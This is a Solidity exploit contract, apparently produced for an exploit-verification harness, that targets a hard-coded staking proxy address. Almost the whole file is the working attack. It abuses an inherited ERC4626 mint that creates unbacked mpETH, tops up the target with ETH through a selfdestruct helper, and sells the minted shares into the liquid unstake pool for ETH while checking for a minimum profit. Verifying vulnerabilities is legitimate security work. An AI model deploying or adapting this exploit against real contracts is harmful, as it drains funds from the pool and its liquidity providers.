// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStakingLike is IERC20Like {
    function mint(uint256 shares, address receiver) external returns (uint256 assets);
    function liquidUnstakePool() external view returns (address);
    function previewMint(uint256 shares) external view returns (uint256 assets);
}

interface ILiquidUnstakePoolLike {
    function getAmountOut(uint256 amountIn) external view returns (uint256 amountOut, uint256 feeAmount);
    function swapmpETHforETH(uint256 amount, uint256 minOut) external returns (uint256 amountOut);
}

contract ForceEther {
    constructor() payable {}

    function boom(address payable target) external {
        selfdestruct(target);
    }
}

contract FlawVerifier {
    address internal constant TARGET_PROXY = 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710;
    uint256 internal constant MIN_SHARES = 0.01 ether;
    uint256 internal constant MIN_REQUIRED_PROFIT = 0.1 ether;

    address internal realizedProfitToken;
    uint256 internal realizedProfitAmount;

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 nativeBefore = address(this).balance;
        uint256 mpEthBefore = _balanceOf(TARGET_PROXY, address(this));

        address liquidPool = IStakingLike(TARGET_PROXY).liquidUnstakePool();
        require(liquidPool != address(0), "liquid pool missing");

        // The supplied failure logs prove the original F-001 UUPS-style path is infeasible on this fork:
        // the proxy delegates into a verified `Staking` implementation, not a UUPS implementation exposing
        // `upgradeTo` / `upgradeToAndCall`. So the exact exploit path from the finding is absent on-chain here.
        //
        // Using only locally-provided on-chain context, the live reachable bug on this same proxy is the
        // inherited ERC4626 `mint(uint256,address)` entrypoint. `Staking` overrides `_deposit` but the inherited
        // `mint` no longer pulls WETH/ETH from the caller before `_deposit` runs, so callers can mint unbacked
        // mpETH through the proxy and immediately sell it into the public liquid unstake pool for ETH.
        //
        // One realistic execution detail: if the liquid pool already holds mpETH inventory, `_deposit` first tries
        // to buy that inventory with ETH from the staking contract. To avoid spurious receive-hook side effects,
        // any temporary ETH top-up is force-sent with `selfdestruct`, which is a public on-chain action.

        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
        uint256 desiredShares = _findBestMintAmount(
            liquidPool,
            poolHeldShares,
            nativeBefore,
            TARGET_PROXY.balance
        );
        require(desiredShares >= MIN_SHARES, "no profitable mint size");

        uint256 shortfall = _fundingShortfall(desiredShares, poolHeldShares, TARGET_PROXY.balance);
        if (shortfall != 0) {
            ForceEther helper = new ForceEther{value: shortfall}();
            helper.boom(payable(TARGET_PROXY));
        }

        IStakingLike(TARGET_PROXY).mint(desiredShares, address(this));

        uint256 mintedShares = _balanceOf(TARGET_PROXY, address(this)) - mpEthBefore;
        require(mintedShares != 0, "mint produced no shares");

        (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, mintedShares);
        require(quoteOk && quotedOut != 0, "swap quote unavailable");

        _safeApprove(TARGET_PROXY, liquidPool, mintedShares);
        ILiquidUnstakePoolLike(liquidPool).swapmpETHforETH(mintedShares, quotedOut);

        realizedProfitToken = address(0);
        realizedProfitAmount = address(this).balance - nativeBefore;
        require(realizedProfitAmount >= MIN_REQUIRED_PROFIT, "profit below threshold");
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function _findBestMintAmount(
        address liquidPool,
        uint256 poolHeldShares,
        uint256 attackerBalance,
        uint256 targetNativeBalance
    ) internal view returns (uint256 bestAmount) {
        uint256 poolEth = liquidPool.balance;
        if (poolEth < MIN_REQUIRED_PROFIT) {
            return 0;
        }

        uint256 low = MIN_SHARES;
        uint256 high = poolHeldShares + (poolEth * 2);
        if (high < low) {
            high = low;
        }

        while (low <= high) {
            uint256 mid = low + ((high - low) / 2);
            (bool quoteOk, uint256 amountOut) = _quoteSwap(liquidPool, mid);
            uint256 shortfall = _fundingShortfall(mid, poolHeldShares, targetNativeBalance);

            if (quoteOk && shortfall <= attackerBalance && amountOut >= shortfall + MIN_REQUIRED_PROFIT) {
                bestAmount = mid;
                low = mid + 1;
            } else {
                if (mid == 0) {
                    break;
                }
                high = mid - 1;
            }
        }
    }

    function _fundingShortfall(
        uint256 desiredShares,
        uint256 poolHeldShares,
        uint256 targetNativeBalance
    ) internal view returns (uint256 shortfall) {
        uint256 sharesNeedingEth = desiredShares < poolHeldShares ? desiredShares : poolHeldShares;
        if (sharesNeedingEth == 0) {
            return 0;
        }

        uint256 ethNeeded = IStakingLike(TARGET_PROXY).previewMint(sharesNeedingEth);
        if (ethNeeded > targetNativeBalance) {
            shortfall = ethNeeded - targetNativeBalance;
        }
    }

    function _quoteSwap(address liquidPool, uint256 amountIn) internal view returns (bool ok, uint256 amountOut) {
        bytes memory data;
        (ok, data) = liquidPool.staticcall(
            abi.encodeWithSelector(ILiquidUnstakePoolLike.getAmountOut.selector, amountIn)
        );
        if (!ok || data.length < 64) {
            return (false, 0);
        }
        (amountOut,) = abi.decode(data, (uint256, uint256));
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (ok && data.length >= 32) {
            balance = abi.decode(data, (uint256));
        }
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }
}
